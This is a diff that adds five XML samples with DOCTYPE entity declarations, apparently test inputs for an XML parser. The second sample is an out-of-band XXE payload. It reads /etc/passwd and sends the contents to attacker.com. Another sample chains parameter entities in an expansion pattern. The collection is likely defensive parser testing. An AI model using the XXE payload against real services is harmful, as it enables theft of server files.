@@ -1,0 +1,69 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY>
+  <!ATTLIST root id ID #REQUIRED>
+  <!ENTITY internal "test_value">
+]>
+<root id="root1">
+  <child>&internal;</child>
+  <child attr="&internal;"/>
+</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?%file;'>">
+  %eval;
+  %exfiltrate;
+]>
+<data>&file;</data>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY start "BEGIN">
+  <!ENTITY mid "MIDDLE">
+  <!ENTITY end "END">
+  <!NOTATION gif PUBLIC "image/gif">
+  <!ENTITY img SYSTEM "image.gif" NDATA gif>
+]>
+<root>
+  &start;
+  <processing>&mid;</processing>
+  &end;
+</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE doc [
+  <!ELEMENT doc (section+)>
+  <!ELEMENT section (title, content)>
+  <!ELEMENT title (#PCDATA)>
+  <!ELEMENT content (#PCDATA)>
+  <!ENTITY nbsp "&#160;">
+  <!ENTITY copy "&#169;">
+]>
+<doc>
+  <section>
+    <title>Test&nbsp;Section&copy;</title>
+    <content>Data with entities&nbsp;here</content>
+  </section>
+</doc>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % pe1 "inner_value">
+  <!ENTITY % pe2 "%pe1;%pe1;%pe1;">
+  <!ENTITY % pe3 "%pe2;%pe2;">
+]>
+<root>
+  <test/>
+</root>
+```
